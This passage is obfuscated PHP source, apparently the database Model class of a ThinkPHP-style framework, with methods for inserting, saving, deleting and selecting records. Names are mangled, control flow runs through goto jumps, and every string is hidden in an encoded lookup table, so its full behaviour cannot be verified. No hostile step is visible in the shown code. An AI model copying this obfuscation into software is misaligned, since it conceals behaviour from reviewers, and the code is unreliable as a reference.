($EÊõƒù‰Èğ as $aÏ¥ô¶µçÖ => $CÑŞË½·‘) { $DÌõ¥Ş‹„ğ[$aÏ¥ô¶µçÖ] = $CÑŞË½·‘[$B¼°˜‚•çÕ[29]]; if ($CÑŞË½·‘[$B¼°˜‚•çÕ[36]]) { $this->fields[$B¼°˜‚•çÕ[239]] = $aÏ¥ô¶µçÖ; if ($CÑŞË½·‘[$B¼°˜‚•çÕ[39]]) { $this->fields[$B¼°˜‚•çÕ[238]] = !0; } } } $this->fields[$B¼°˜‚•çÕ[240]] = $DÌõ¥Ş‹„ğ; if (think_config($B¼°˜‚•çÕ[236])) { $this->fields[$B¼°˜‚•çÕ[237]] = think_config($B¼°˜‚•çÕ[236]); } goto d†¶Æ¥â½Õ; eÆ§º™†åù: $B¼°˜‚•çÕ =& $_SERVER[¯Ò¬Èè]; $this->db->setModel($this->name); $EÊõƒù‰Èğ = $this->db->getFields($this->getTableName()); goto E‹“¥ø‚áŠ; d†¶Æ¥â½Õ: if (think_config($B¼°˜‚•çÕ[233])) { $Fæ¬îŠºº = $this->dbName ? $this->dbName : think_config($B¼°˜‚•çÕ[234]); think_var_cache($B¼°˜‚•çÕ[235] . strtolower(get_path_this($Fæ¬îŠºº) . $B¼°˜‚•çÕ[91] . $this->name), $this->fields); } goto cÆ‰ìóìÄª; cÆ‰ìóìÄª: } public function switchModel($DÔË‘²¬¬Å, $a²ƒ‚‘òĞ™ = array()) { $Cµ¼ƒä‘ã =& $_SERVER[¯Ò¬Èè]; $a­µãÙ÷½Ğ = ucwords(strtolower($DÔË‘²¬¬Å)) . $Cµ¼ƒä‘ã[241]; if (!class_exists($a­µãÙ÷½Ğ)) { think_exception($a­µãÙ÷½Ğ . think_lang($Cµ¼ƒä‘ã[242])); } $this->_extModel = new $a­µãÙ÷½Ğ($this->name); if (!empty($a²ƒ‚‘òĞ™)) { foreach ($a²ƒ‚‘òĞ™ as $e×÷¬éƒÈœ) { $this->_extModel->setProperty($e×÷¬éƒÈœ, $this->{$e×÷¬éƒÈœ}); } } return $this->_extModel; } public function __set($B…ˆ–—â÷‰, $B†÷Œ¤Ô‡) { $this->data[$B…ˆ–—â÷‰] = $B†÷Œ¤Ô‡; } public function __get($c…ó‚«æ§Ã) { return isset($this->data[$c…ó‚«æ§Ã]) ? $this->data[$c…ó‚«æ§Ã] : null; } public function __isset($EöÃ©ÔŞ˜) { return isset($this->data[$EöÃ©ÔŞ˜]); } public function __unset($Bèâ‡¢˜Š°) { unset($this->data[$Bèâ‡¢˜Š°]); } public function __call($A­·†ÕÌ˜„, $E‡Å¯ê§Ä) { $A–×ˆÒØ‘Š =& $_SERVER[¯Ò¬Èè]; if (in_array(strtolower($A­·†ÕÌ˜„), $this->methods, !0)) { $this->options[strtolower($A­·†ÕÌ˜„)] = $E‡Å¯ê§Ä[0]; return $this; } elseif (in_array(strtolower($A­·†ÕÌ˜„), array($A–×ˆÒØ‘Š[243], $A–×ˆÒØ‘Š[244], $A–×ˆÒØ‘Š[245], $A–×ˆÒØ‘Š[246], $A–×ˆÒØ‘Š[247]), !0)) { $E™ŒïŒ¸µò = isset($E‡Å¯ê§Ä[0]) ? $E‡Å¯ê§Ä[0] : $A–×ˆÒØ‘Š[176]; $E™ŒïŒ¸µò = $this->db->parseKey($E™ŒïŒ¸µò); return $this->getField(strtoupper($A­·†ÕÌ˜„) . $A–×ˆÒØ‘Š[248] . $E™ŒïŒ¸µò . $A–×ˆÒØ‘Š[249] . $A­·†ÕÌ˜„, $A–×ˆÒØ‘Š[243]); } elseif (strtolower(substr($A­·†ÕÌ˜„, 0, 5)) == $A–×ˆÒØ‘Š[250]) { $E™ŒïŒ¸µò = think_parse_name(substr($A­·†ÕÌ˜„, 5)); $C Æ‚ŒÀñŒ[$E™ŒïŒ¸µò] = $E‡Å¯ê§Ä[0]; return $this->where($C Æ‚ŒÀñŒ)->find(); } elseif (strtolower(substr($A­·†ÕÌ˜„, 0, 10)) == $A–×ˆÒØ‘Š[251]) { $DµŞæÊ‹¸× = think_parse_name(substr($A­·†ÕÌ˜„, 10)); $C Æ‚ŒÀñŒ[$DµŞæÊ‹¸×] = $E‡Å¯ê§Ä[0]; return $this->where($C Æ‚ŒÀñŒ)->getField($E‡Å¯ê§Ä[1]); } elseif (isset($this->_scope[$A­·†ÕÌ˜„])) { return $this->scope($A­·†ÕÌ˜„, $E‡Å¯ê§Ä[0]); } elseif (method_exists($this, $A­·†ÕÌ˜„)) { array_unshift($E‡Å¯ê§Ä, $A­·†ÕÌ˜„); return call_user_func_array(array($this, $A–×ˆÒØ‘Š[252]), $E‡Å¯ê§Ä); } else { return call_user_func_array(array(parent, $A­·†ÕÌ˜„), $E‡Å¯ê§Ä); } } protected function call() { goto c¡ÈÃ·äƒ; FŞ†µ†À¬¬: $F³ËæîÖğ‹ = $e‰ÑùïİÔ„; if (is_array($e‰ÑùïİÔ„)) { $F³ËæîÖğ‹ = $e‰ÑùïİÔ„[1]; $e‰ÑùïİÔ„ = $e‰ÑùïİÔ„[0]; } $D°Íù¸‚Ş— = count($fè÷¥ˆ¶ßÚ) - 1; goto EœÂµŸÉ×ó; EœÂµŸÉ×ó: if (isset($fè÷¥ˆ¶ßÚ[$D°Íù¸‚Ş—]) && $fè÷¥ˆ¶ßÚ[$D°Íù¸‚Ş—] === $e‰ÑùïİÔ„) { think_exception(__CLASS__ . $dãÛù›‡È[4] . $e‰ÑùïİÔ„ . think_lang($dãÛù›‡È[253])); return; } $fè÷¥ˆ¶ßÚ[] = $e‰ÑùïİÔ„; if (method_exists($this, $dãÛù›‡È[254])) { $bÍ»¿Ë² = call_user_func_array(array($this, $dãÛù›‡È[255]), array($F³ËæîÖğ‹, $fè÷¥ˆ¶ßÚ)); if (!is_null($bÍ»¿Ë²) && $bÍ»¿Ë² !== !1) { return $bÍ»¿Ë²; } } goto cÃÇ¯®†ù; cÃÇ¯®†ù: $bº¬ÊœÄ¹– = call_user_func_array(array($this, $e‰ÑùïİÔ„), $fè÷¥ˆ¶ßÚ); if (method_exists($this, $dãÛù›‡È[256])) { $bÍ»¿Ë² = call_user_func_array(array($this, $dãÛù›‡È[257]), array($F³ËæîÖğ‹, $fè÷¥ˆ¶ßÚ, $bº¬ÊœÄ¹–)); if ($bÍ»¿Ë²) { return $bÍ»¿Ë²; } } return $bº¬ÊœÄ¹–; goto e°–±Ò ¬é; c¡ÈÃ·äƒ: $dãÛù›‡È =& $_SERVER[¯Ò¬Èè]; $fè÷¥ˆ¶ßÚ = func_get_args(); $e‰ÑùïİÔ„ = array_shift($fè÷¥ˆ¶ßÚ); goto FŞ†µ†À¬¬; e°–±Ò ¬é: } protected function _initialize() { } protected function _facade($bŞ¹øÒïØ¿) { $C‚Ï—À´‚ =& $_SERVER[¯Ò¬Èè]; if (!empty($this->fields)) { foreach ($bŞ¹øÒïØ¿ as $Få²éĞ¥‹ => $FçÒÊ¹ø¨‡) { if (!in_array($Få²éĞ¥‹, $this->fields, !0)) { unset($bŞ¹øÒïØ¿[$Få²éĞ¥‹]); } elseif (is_scalar($FçÒÊ¹ø¨‡)) { $this->_parseType($bŞ¹øÒïØ¿, $Få²éĞ¥‹); } } } if (!empty($this->options[$C‚Ï—À´‚[258]])) { $bŞ¹øÒïØ¿ = array_map($this->options[$C‚Ï—À´‚[258]], $bŞ¹øÒïØ¿); unset($this->options[$C‚Ï—À´‚[258]]); } $this->_beforeWrite($bŞ¹øÒïØ¿); return $bŞ¹øÒïØ¿; } protected function _beforeWrite(&$FÉªÕÙá) { } public function add($b‹”‡âšôÓ = '', $D¬¨“ô•µÃ = array(), $EÈÀË´Á® = false) { goto D‘Ò´¯Ã×Õ; FïœÓÇË÷‡: return $cø›ãº¯Îƒ; goto bİ‡”ğ´Ã…; D‘Ò´¯Ã×Õ: if (empty($b‹”‡âšôÓ)) { if (!empty($this->data)) { $b‹”‡âšôÓ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[¯Ò¬Èè][259]); return !1; } } $D¬¨“ô•µÃ = $this->_parseOptions($D¬¨“ô•µÃ); $b‹”‡âšôÓ = $this->_facade($b‹”‡âšôÓ); goto f‡—©‹Ê…ñ; f‡—©‹Ê…ñ: if (!1 === $this->_beforeInsert($b‹”‡âšôÓ, $D¬¨“ô•µÃ)) { return !1; } $cø›ãº¯Îƒ = $this->db->insert($b‹”‡âšôÓ, $D¬¨“ô•µÃ, $EÈÀË´Á®); if (!1 !== $cø›ãº¯Îƒ) { $C«•É¾İÎ = $this->getLastInsID(); if ($C«•É¾İÎ) { $b‹”‡âšôÓ[$this->getPk()] = $C«•É¾İÎ; $this->_after_insert($b‹”‡âšôÓ, $D¬¨“ô•µÃ); return $C«•É¾İÎ; } $this->_after_insert($b‹”‡âšôÓ, $D¬¨“ô•µÃ); } goto FïœÓÇË÷‡; bİ‡”ğ´Ã…: } protected function _beforeInsert(&$d¹Ÿ‰ ˜Ôö, $B´Ù…Ì µ¡) { } protected function _after_insert($a¥µ‰Öµƒã, $fÉŒÕ¤î£˜) { } public function addAll($A—Ë…õÛç¤, $e½²…™ôŠİ = array(), $F¹ˆÉÅè¢ = false) { goto A¸¼Õ¨¬Ô¤; F˜Æê‰ƒ: foreach ($A—Ë…õÛç¤ as $c–øä¾¨ => $cáà‡Ÿøˆ) { $A—Ë…õÛç¤[$c–øä¾¨] = $this->_facade($cáà‡Ÿøˆ); } if (method_exists($this->db, $b‡Ç¸ÂÔÃ[260])) { $d«´îÑ¿ï± = $this->db->insertAll($A—Ë…õÛç¤, $e½²…™ôŠİ, $F¹ˆÉÅè¢); } else { $this->startTrans(); foreach ($A—Ë…õÛç¤ as $c–øä¾¨ => $cáà‡Ÿøˆ) { $d«´îÑ¿ï± = $this->db->insert($cáà‡Ÿøˆ, $e½²…™ôŠİ, $F¹ˆÉÅè¢); } $this->commit(); } if (!1 !== $d«´îÑ¿ï±) { $f´®¿ß·Ñœ = $this->getLastInsID(); if ($f´®¿ß·Ñœ) { return $f´®¿ß·Ñœ; } } goto eë°¨ã“ô; A¸¼Õ¨¬Ô¤: $b‡Ç¸ÂÔÃ =& $_SERVER[¯Ò¬Èè]; if (empty($A—Ë…õÛç¤)) { $this->error = think_lang($b‡Ç¸ÂÔÃ[259]); return !1; } $e½²…™ôŠİ = $this->_parseOptions($e½²…™ôŠİ); goto F˜Æê‰ƒ; eë°¨ã“ô: return $d«´îÑ¿ï±; goto aÀ‘ÎˆóŒ; aÀ‘ÎˆóŒ: } public function selectAdd($c —÷ä‰éÀ = '', $CÃÚºÍ£Ù = '', $a§‰Öëó² = array()) { $e Óºò× =& $_SERVER[¯Ò¬Èè]; $a§‰Öëó² = $this->_parseOptions($a§‰Öëó²); if (!1 === ($EæìñÒÂÂğ = $this->db->selectInsert($c —÷ä‰éÀ ? $c —÷ä‰éÀ : $a§‰Öëó²[$e Óºò×[261]], $CÃÚºÍ£Ù ? $CÃÚºÍ£Ù : $this->getTableName(), $a§‰Öëó²))) { $this->error = think_lang($e Óºò×[262]); return !1; } else { return $EæìñÒÂÂğ; } } public function save($a˜¼…šäÇç = '', $a·ºóäƒ¶ = array()) { goto F¦Û¯Ñ¹íÎ; F¦Û¯Ñ¹íÎ: $eÍîÍÜˆƒ =& $_SERVER[¯Ò¬Èè]; if (empty($a˜¼…šäÇç)) { if (!empty($this->data)) { $a˜¼…šäÇç = $this->data; $this->data = array(); } else { $this->error = think_lang($eÍîÍÜˆƒ[259]); return !1; } } $a˜¼…šäÇç = $this->_facade($a˜¼…šäÇç); goto a÷¯‚ßí¿œ; a÷¯‚ßí¿œ: $a·ºóäƒ¶ = $this->_parseOptions($a·ºóäƒ¶); $cèÚ¹”ù¨Ä = $this->getPk(); if (!isset($a·ºóäƒ¶[$eÍîÍÜˆƒ[263]])) { if (isset($a˜¼…šäÇç[$cèÚ¹”ù¨Ä])) { $F¢ÙŒ‘Ÿ¸Ä[$cèÚ¹”ù¨Ä] = $a˜¼…šäÇç[$cèÚ¹”ù¨Ä]; $a·ºóäƒ¶[$eÍîÍÜˆƒ[263]] = $F¢ÙŒ‘Ÿ¸Ä; unset($a˜¼…šäÇç[$cèÚ¹”ù¨Ä]); } else { $this->error = think_lang($eÍîÍÜˆƒ[262]); return !1; } } goto fŸô°µÈµå; A¿‹ÅÄ¾±: if (!1 !== $DŒ•—êè×) { if (isset($D«¨Æ•„®)) { $a˜¼…šäÇç[$cèÚ¹”ù¨Ä] = $D«¨Æ•„®; } $this->_afterUpdate($a˜¼…šäÇç, $a·ºóäƒ¶); } return $DŒ•—êè×; goto EÊÓ”ÓõâÃ; fŸô°µÈµå: if (is_array($a·ºóäƒ¶[$eÍîÍÜˆƒ[263]]) && isset($a·ºóäƒ¶[$eÍîÍÜˆƒ[263]][$cèÚ¹”ù¨Ä])) { $D«¨Æ•„® = $a·ºóäƒ¶[$eÍîÍÜˆƒ[263]][$cèÚ¹”ù¨Ä]; } if (!1 === $this->_beforeUpdate($a˜¼…šäÇç, $a·ºóäƒ¶)) { return !1; } $DŒ•—êè× = $this->db->update($a˜¼…šäÇç, $a·ºóäƒ¶); goto A¿‹ÅÄ¾±; EÊÓ”ÓõâÃ: } protected function _beforeUpdate(&$Dçô‡Í‰Ğƒ, $fòœ›ªä) { } protected function _afterUpdate($CœŞØ×ö„, $D‚õàŒ¨Š™) { } public function delete($A¤æ…Ë§áƒ = array()) { goto c™ªÜ÷ÇíÃ; c™ªÜ÷ÇíÃ: $a„‰Š„Ëã« =& $_SERVER[¯Ò¬Èè]; if (empty($A¤æ…Ë§áƒ) && empty($this->options[$a„‰Š„Ëã«[263]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $eñÖôëÆ¼ã = $this->getPk(); goto F¤«±¦­ª; F¤«±¦­ª: if (is_numeric($A¤æ…Ë§áƒ) || is_string($A¤æ…Ë§áƒ)) { if (strpos($A¤æ…Ë§áƒ, $a„‰Š„Ëã«[47])) { $B‡„‰™³”¸[$eñÖôëÆ¼ã] = array($a„‰Š„Ëã«[264], $A¤æ…Ë§áƒ); } else { $B‡„‰™³”¸[$eñÖôëÆ¼ã] = $A¤æ…Ë§áƒ; } $this->options[$a„‰Š„Ëã«[263]] = $B‡„‰™³”¸; } $A¤æ…Ë§áƒ = $this->_parseOptions(); if (is_array($A¤æ…Ë§áƒ[$a„‰Š„Ëã«[263]]) && isset($A¤æ…Ë§áƒ[$a„‰Š„Ëã«[263]][$eñÖôëÆ¼ã])) { $eªğ¹Ïë‰å = $A¤æ…Ë§áƒ[$a„‰Š„Ëã«[263]][$eñÖôëÆ¼ã]; } goto aºğˆòãÖ¶; aºğˆòãÖ¶: $D…ò¥Êì = $this->db->delete($A¤æ…Ë§áƒ); if (!1 !== $D…ò¥Êì) { $E¼Ù©ŠŠë™ = array(); if (isset($eªğ¹Ïë‰å)) { $E¼Ù©ŠŠë™[$eñÖôëÆ¼ã] = $eªğ¹Ïë‰å; } $this->_after_delete($E¼Ù©ŠŠë™, $A¤æ…Ë§áƒ); } return $D…ò¥Êì; goto f·ì¾»Á£ƒ; f·ì¾»Á£ƒ: } protected function _after_delete($dÌç™÷«õº, $fé¤¹†ñƒø) { } public function select($c»Ú¯›±ê† = array()) { goto C÷…‡éøê; a‹—®¥ŠÆ·: $A¾‹²œ¦ÆÚ = $this->db->select($c»Ú¯›±ê†); if (!1 === $A¾‹²œ¦ÆÚ) { return !1; } if (empty($A¾‹²œ¦ÆÚ)) { return null; } goto Bä¿¯Ğ¦µ; Bä¿¯Ğ¦µ: $this->_afterSelect($A¾‹²œ¦ÆÚ, $c»Ú¯›±ê†); return $A¾‹²œ¦ÆÚ; goto dòÅÎ·–; C÷…‡éøê: $Aª‚¤’ÓÌ« =& $_SERVER[¯Ò¬Èè]; if (is_string($c»Ú¯›±ê†) || is_numeric($c»Ú¯›±ê†)) { $BàÂÃ‰ëŸ„ = $this->getPk(); if (strpos($c»Ú¯›±ê†, $Aª‚¤’ÓÌ«[47])) { $Dì¤»”ØÆ[$BàÂÃ‰ëŸ„] = array($Aª‚¤’ÓÌ«[264], $c»Ú¯›±ê†); } else { $Dì¤»”ØÆ[$BàÂÃ‰ëŸ„] = $c»Ú¯›±ê†; } $this->options[$Aª‚¤’ÓÌ«[263]] = $Dì¤»”ØÆ; } elseif (!1 === $c»Ú¯›±ê†) { $c»Ú¯›±ê† = $this->_parseOptions(); return $Aª‚¤’ÓÌ«[265] . $this->db->buildSelectSql($c»Ú¯›±ê†) . $Aª‚¤’ÓÌ«[266]; } $c»Ú¯›±ê† = $this->_parseOptions(); goto a‹—®¥ŠÆ·; dòÅÎ·–: } protected function _afterSelect(&$e§§¾ÙâÊê, $d®¬¼’‘­ã) { } public function buildSql($E«©ë“§‚â = array()) { $dšá¬à¡ŒÃ =& $_SERVER[¯Ò¬Èè]; $E«©ë“§‚â = $this->_parseOptions($E«©ë“§‚â); return $dšá¬à¡ŒÃ[265] . $this->db->buildSelectSql($E«©ë“§‚â) . $dšá¬à¡ŒÃ[266]; } public function optionsValue($B®‹˜õÈã» = null) { if (is_null($B®‹˜õÈã»)) { return $this->options; } elseif (is_array($B®‹˜õÈã»)) { $this->options = array_merge($this->options, $B®‹˜õÈã»); } } protected function _parseOptions($c£‡†¼ÓŠ = array()) { goto a‰ôš’Ûœ; a‰ôš’Ûœ: $c¨Ùœä÷Û =& $_SERVER[¯Ò¬Èè]; if (is_array($c£‡†¼ÓŠ)) { $c£‡†¼ÓŠ = array_merge($this->options, $c£‡†¼ÓŠ); } $this->options = array(); goto F«Ë¹¶œƒ; F«Ë¹¶œƒ: if (!isset($c£‡†¼ÓŠ[$c¨Ùœä÷Û[267]])) { $c£‡†¼ÓŠ[$c¨Ùœä÷Û[267]] = $this->getTableName(); $A¯îø¿¦ö´ = $this->fields; } else { $A¯îø¿¦ö´ = $this->getDbFields(); } if (!empty($c£‡†¼ÓŠ[$c¨Ùœä÷Û[268]])) { $c£‡†¼ÓŠ[$c¨Ùœä÷Û[267]] .= $c¨Ùœä÷Û[50] . $c£‡†¼ÓŠ[$c¨Ùœä÷Û[268]]; } $c£‡†¼ÓŠ[$c¨Ùœä÷Û[269]] = $this->name; goto fäğ¹Ã¶ù–; fäğ¹Ã¶ù–: if (isset($c£‡†¼ÓŠ[$c¨Ùœä÷Û[263]]) && is_array($c£‡†¼ÓŠ[$c¨Ùœä÷Û[263]]) && !empty($A¯îø¿¦ö´) && !isset($c£‡†¼ÓŠ[$c¨Ùœä÷Û[270]]) && !isset($c£‡†¼ÓŠ[$c¨Ùœä÷Û[267]])) { foreach ($c£‡†¼ÓŠ[$c¨Ùœä÷Û[263]] as $dï§è§½ÛÕ => $c¿Üğ¢Úˆä) { $dï§è§½ÛÕ = trim($dï§è§½ÛÕ); if (in_array($dï§è§½ÛÕ, $A¯îø¿¦ö´, !0)) { if (is_scalar($c¿Üğ¢Úˆä)) { $this->_parseType($c£‡†¼ÓŠ[$c¨Ùœä÷Û[263]], $dï§è§½ÛÕ); } } elseif (!is_numeric($dï§è§½ÛÕ) && $c¨Ùœä÷Û[70] != substr($dï§è§½ÛÕ, 0, 1) && !1 === strpos($dï§è§½ÛÕ, $c¨Ùœä÷Û[91]) && !1 === strpos($dï§è§½ÛÕ, $c¨Ùœä÷Û[248]) && !1 === strpos($dï§è§½ÛÕ, $c¨Ùœä÷Û[271]) && !1 === strpos($dï§è§½ÛÕ, $c¨Ùœä÷Û[272])) { unset($c£‡†¼ÓŠ[$c¨Ùœä÷Û[263]][$dï§è§½ÛÕ]); } } } $this->_options_filter($c£‡†¼ÓŠ); return $c£‡†¼ÓŠ; goto B¡ï‚‡ÛÔâ; B¡ï‚‡ÛÔâ: } protected function _options_filter(&$béˆÁ±à) { } protected function _parseType(&$fÛ®±Û¥øÊ, $DğäÜÛöŒ) { $CÇ§¦‚°Õ =& $_SERVER[¯Ò¬Èè]; if (empty($this->options[$CÇ§¦‚°Õ[273]][$CÇ§¦‚°Õ[4] . $DğäÜÛöŒ])) { $AÓ·¿„õ±¿ = strtolower($this->fields[$CÇ§¦‚°Õ[240]][$DğäÜÛöŒ]); if (!1 !== strpos($AÓ·¿„õ±¿, $CÇ§¦‚°Õ[274])) { } elseif (!1 === strpos($AÓ·¿„õ±¿, $CÇ§¦‚°Õ[275]) && !1 !== strpos($AÓ·¿„õ±¿, $CÇ§¦‚°Õ[276])) { $fÛ®±Û¥øÊ[$DğäÜÛöŒ] = intval($fÛ®±Û¥øÊ[$DğäÜÛöŒ]); } elseif (!1 !== strpos($AÓ·¿„õ±¿, $CÇ§¦‚°Õ[277]) || !1 !== strpos($AÓ·¿„õ±¿, $CÇ§¦‚°Õ[278])) { $fÛ®±Û¥øÊ[$DğäÜÛöŒ] = floatval($fÛ®±Û¥øÊ[$DğäÜÛöŒ]); } elseif (!1 !== strpos($AÓ·¿„õ±¿, $CÇ§¦‚°Õ[279])) { $fÛ®±Û¥øÊ[$DğäÜÛöŒ] = (bool) $fÛ®±Û¥øÊ[$DğäÜÛöŒ]; } } } public function find($dÔÌÂ›ó×› = array()) { goto eŠéµáõô; D®íàÒÈÚ: if (empty($F±‹ÈÊ™“Ò)) { return null; } $this->data = $F±‹ÈÊ™“Ò[0]; $this->_afterFind($this->data, $dÔÌÂ›ó×›); goto CñİÕêÁ¾™; eŠéµáõô: $Cœ­ùÇª… =& $_SERVER[¯Ò¬Èè]; if (is_numeric($dÔÌÂ›ó×›) || is_string($dÔÌÂ›ó×›)) { $a¹è«¤ŒìÚ[$this->getPk()] = intval($dÔÌÂ›ó×›); $this->options[$Cœ­ùÇª…[263]] = $a¹è«¤ŒìÚ; } $this->options[$Cœ­ùÇª…[280]] = 1; goto eò£‚ÏÅÎÙ; CñİÕêÁ¾™: if (!empty($this->options[$Cœ­ùÇª…[281]])) { return $this->returnResult($this->data, $this->options[$Cœ­ùÇª…[281]]); } return $this->data; goto c°îÈ©¾‘ó; eò£‚ÏÅÎÙ: $dÔÌÂ›ó×› = $this->_parseOptions(); $F±‹ÈÊ™“Ò = $this->db->select($dÔÌÂ›ó×›); if (!1 === $F±‹ÈÊ™“Ò) { return !1; } goto D®íàÒÈÚ; c°îÈ©¾‘ó: } protected function _afterFind(&$e “óÊË³½, $D†ÎÒîÆ°©) { } protected function returnResult($C„“Ğß¯¶º, $cÕÒ‹å® = '') { $AŸÈÑÓãİ¨ =& $_SERVER[¯Ò¬Èè]; if ($cÕÒ‹å®) { if (is_callable($cÕÒ‹å®)) { return call_user_func($cÕÒ‹å®, $C„“Ğß¯¶º); } switch (strtolower($cÕÒ‹å®)) { case $AŸÈÑÓãİ¨[282]: return json_encode($C„“Ğß¯¶º); case $AŸÈÑÓãİ¨[283]: return xml_encode($C„“Ğß¯¶º); } } return $C„“Ğß¯¶º; } public function parseFieldsMap($DºŒëŠøİ‹, $cš…¾÷‹«é = 1) { if (!empty($this->_map)) { foreach ($this->_map as $Açáê‡â½ => $dæ¶ÖºğŞ„) { if ($cš…¾÷‹«é == 1) { if (isset($DºŒëŠøİ‹[$dæ¶ÖºğŞ„])) { $DºŒëŠøİ‹[$Açáê‡â½] = $DºŒëŠøİ‹[$dæ¶ÖºğŞ„]; unset($DºŒëŠøİ‹[$dæ¶ÖºğŞ„]); } } else { if (isset($DºŒëŠøİ‹[$Açáê‡â½])) { $DºŒëŠøİ‹[$dæ¶ÖºğŞ„] = $DºŒëŠøİ‹[$Açáê‡â½]; unset($DºŒëŠøİ‹[$Açáê‡â½]); } } } } return $DºŒëŠøİ‹; } public function setField($c¬‰ŒƒŞò™, $f…ù¯ˆ‘ï = '') { if (is_array($c¬‰ŒƒŞò™)) { $bÀÄ‰Ö©ğ÷ = $c¬‰ŒƒŞò™; } else { $bÀÄ‰Ö©ğ÷[$c¬‰ŒƒŞò™] = $f…ù¯ˆ‘ï; } return $this->save($bÀÄ‰Ö©ğ÷); } public function setAdd($eäåÖ«¢Ä, $F­’§ŸêÓÏ = 1) { $E«œ°Ş É§ =& $_SERVER[¯Ò¬Èè]; $f”­Ü¬± = $eäåÖ«¢Ä . $E«œ°Ş É§[284] . $F­’§ŸêÓÏ; if ($F­’§ŸêÓÏ < 0) { $f”­Ü¬± = $eäåÖ«¢Ä . $F­’§ŸêÓÏ; } return $this->setField($eäåÖ«¢Ä, array($E«œ°Ş É§[285], $f”­Ü¬±)); } public function getField($e®°·öÕŠ, $cÅƒ¾Ü¡‘¬ = null) { $CõĞŞ¸„½ =& $_SERVER[¯Ò¬Èè]; $f½‰ †áÇå[$CõĞŞ¸„½[261]] = $e®°·öÕŠ; $f½‰ †áÇå = $this->_parseOptions($f½‰ †áÇå); $e®°·öÕŠ = trim($e®°·öÕŠ); if (strpos($e®°·öÕŠ, $CõĞŞ¸„½[47])) { if (!isset($f½‰ †áÇå[$CõĞŞ¸„½[280]])) { $f½‰ †áÇå[$CõĞŞ¸„½[280]] = is_numeric($cÅƒ¾Ü¡‘¬) ? $cÅƒ¾Ü¡‘¬ : $CõĞŞ¸„½[33]; } $dÜ¼è·„— = $this->db->select($f½‰ †áÇå); if (!empty($dÜ¼è·„—)) { goto CÉÔÀßì; CÉÔÀßì: $e“´‰ìé—• = explode($CõĞŞ¸„½[47], $e®°·öÕŠ); $e®°·öÕŠ = array_keys($dÜ¼è·„—[0]); $fÓ°³ÇÒ¦ = array_shift($e®°·öÕŠ); goto a¦¸¬¦À‰‘; f¥ƒê¼Í‰: foreach ($dÜ¼è·„— as $fà‘›¦¦™) { $Eğ½Í¹ªã = $fà‘›¦¦™[$fÓ°³ÇÒ¦]; if (2 == $c’´‘ÛäìÉ) { $c¤§ë½âé´[$Eğ½Í¹ªã] = $fà‘›¦¦™[$cË·ĞÓ¯ƒ]; } else { $c¤§ë½âé´[$Eğ½Í¹ªã] = is_string($cÅƒ¾Ü¡‘¬) ? implode($cÅƒ¾Ü¡‘¬, $fà‘›¦¦™) : $fà‘›¦¦™; } } return $c¤§ë½âé´; goto C¿İ£Ó…õ¢; a¦¸¬¦À‰‘: $cË·ĞÓ¯ƒ = array_shift($e®°·öÕŠ); $c¤§ë½âé´ = array(); $c’´‘ÛäìÉ = count($e“´‰ìé—•); goto f¥ƒê¼Í‰; C¿İ£Ó…õ¢: } } else { if (!0 !== $cÅƒ¾Ü¡‘¬) { $f½‰ †áÇå[$CõĞŞ¸„½[280]] = is_numeric($cÅƒ¾Ü¡‘¬) ? $cÅƒ¾Ü¡‘¬ : 1; } if ($cÅƒ¾Ü¡‘¬ === $CõĞŞ¸„½[243]) { unset($f½‰ †áÇå[$CõĞŞ¸„½[280]]); } $fà‘›¦¦™ = $this->db->select($f½‰ †áÇå); if (!empty($fà‘›¦¦™)) { if ($cÅƒ¾Ü¡‘¬ === $CõĞŞ¸„½[243]) { return reset($fà‘›¦¦™[0]); } if (!0 !== $cÅƒ¾Ü¡‘¬ && 1 == $f½‰ †áÇå[$CõĞŞ¸„½[280]]) { return reset($fà‘›¦¦™[0]); } foreach ($fà‘›¦¦™ as $fó¼«¼¨§Ò) { $aãõ®±š[] = $fó¼«¼¨§Ò[$e®°·öÕŠ]; } return $aãõ®±š; } } return null; } public function create($cİÛŒ¨ÉÚ = '', $bÂ®³Ó‰¬ = '') { goto Dø…¨™…ªá; Dø…¨™…ªá: $C÷ß¿ˆÜ¿¿ =& $_SERVER[¯Ò¬Èè]; if (empty($cİÛŒ¨ÉÚ)) { $cİÛŒ¨ÉÚ = $_POST; } elseif (is_object($cİÛŒ¨ÉÚ)) { $cİÛŒ¨ÉÚ = get_object_vars($cİÛŒ¨ÉÚ); } if (empty($cİÛŒ¨ÉÚ) || !is_array($cİÛŒ¨ÉÚ)) { $this->error = think_lang($C÷ß¿ˆÜ¿¿[259]); return !1; } goto dğ‘³Û×¦; Aƒ±¾ŸĞ†: return $cİÛŒ¨ÉÚ; goto B«×®Ê“© ; EŒ‹®Û¾¦š: if ($this->autoCheckFields) { $FÑÕ‚„š = $this->getDbFields(); foreach ($cİÛŒ¨ÉÚ as $f¸ÏÜ‚óãŞ => $EŠñê“´†) { if (!in_array($f¸ÏÜ‚óãŞ, $FÑÕ‚„š)) { unset($cİÛŒ¨ÉÚ[$f¸ÏÜ‚óãŞ]); } elseif (MAGIC_QUOTES_GPC && is_string($EŠñê“´†)) { $cİÛŒ¨ÉÚ[$f¸ÏÜ‚óãŞ] = stripslashes($EŠñê“´†); } } } $this->autoOperation($cİÛŒ¨ÉÚ, $bÂ®³Ó‰¬); $this->data = $cİÛŒ¨ÉÚ; goto Aƒ±¾ŸĞ†; FÉ‡è‚ Ÿ‚: if (isset($FÑÕ‚„š)) { if (is_string($FÑÕ‚„š)) { $FÑÕ‚„š = explode($C÷ß¿ˆÜ¿¿[47], $FÑÕ‚„š); } if (think_config($C÷ß¿ˆÜ¿¿[286])) { $FÑÕ‚„š[] = think_config($C÷ß¿ˆÜ¿¿[287]); } foreach ($cİÛŒ¨ÉÚ as $f¸ÏÜ‚óãŞ => $EŠñê“´†) { if (!in_array($f¸ÏÜ‚óãŞ, $FÑÕ‚„š)) { unset($cİÛŒ¨ÉÚ[$f¸ÏÜ‚óãŞ]); } } } if (!$this->autoValidation($cİÛŒ¨ÉÚ, $bÂ®³Ó‰¬)) { return !1; } if (!$this->autoCheckToken($cİÛŒ¨ÉÚ)) { $this->error = think_lang($C÷ß¿ˆÜ¿¿[288]); return !1; } goto EŒ‹®Û¾¦š; dğ‘³Û×¦: $cİÛŒ¨ÉÚ = $this->parseFieldsMap($cİÛŒ¨ÉÚ, 0); $bÂ®³Ó‰¬ = $bÂ®³Ó‰¬ ? $bÂ®³Ó‰¬ : (!empty($cİÛŒ¨ÉÚ[$this->getPk()]) ? 